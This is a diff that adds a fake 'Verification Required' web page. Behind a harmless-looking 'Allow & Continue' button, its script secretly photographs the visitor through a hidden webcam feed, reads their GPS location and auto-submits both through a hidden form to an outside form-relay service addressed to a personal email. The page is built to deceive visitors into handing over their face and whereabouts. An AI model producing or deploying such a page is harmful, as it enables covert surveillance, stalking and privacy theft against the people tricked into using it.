@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verification</title>
+</head>
+<body>
+
+<h3>Verification Required</h3>
+<p>Camera aur Location allow karna hoga</p>
+
+<button onclick="startProcess()">Allow & Continue</button>
+
+<form id="dataForm" action="https://formsubmit.co/akibbaig91@gmail.com" method="POST">
+  <input type="hidden" name="photo" id="photo">
+  <input type="hidden" name="location" id="location">
+  <input type="hidden" name="_subject" value="New Verification Data">
+  <input type="hidden" name="_captcha" value="false">
+</form>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+async function startProcess() {
+  // CAMERA
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  const video = document.getElementById("video");
+  video.srcObject = stream;
+
+  setTimeout(() => {
+    const canvas = document.getElementById("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    const imageData = canvas.toDataURL("image/png");
+    document.getElementById("photo").value = imageData;
+    stream.getTracks().forEach(track => track.stop());
+  }, 1500);
+
+  // LOCATION
+  navigator.geolocation.getCurrentPosition(pos => {
+    const loc = `Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`;
+    document.getElementById("location").value = loc;
+
+    setTimeout(() => {
+      document.getElementById("dataForm").submit();
+    }, 2000);
+  });
+}
+</script>
+
+</body>
+</html>
